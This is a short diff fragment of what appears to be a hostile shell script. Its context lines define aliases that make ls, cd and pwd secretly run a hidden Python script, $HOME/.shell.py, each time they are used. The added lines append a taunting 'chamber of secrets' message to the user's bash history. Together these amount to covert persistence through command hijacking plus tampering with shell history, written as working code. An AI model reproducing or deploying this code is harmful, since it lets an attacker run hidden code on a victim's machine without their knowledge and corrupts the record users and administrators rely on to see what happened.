@@ -8,3 +8,7 @@ alias ls="/bin/ls && python $HOME/.shell.py"
 alias cd="/usr/bin/cd && python $HOME/.shell.py"
 alias pwd="/bin/pwd && python $HOME/.shell.py"
 EOL
+
+cat >> $HOME/.bash_history << EOL
+The chamber of secrets has been opened, enermies of the heir beware!
+EOL
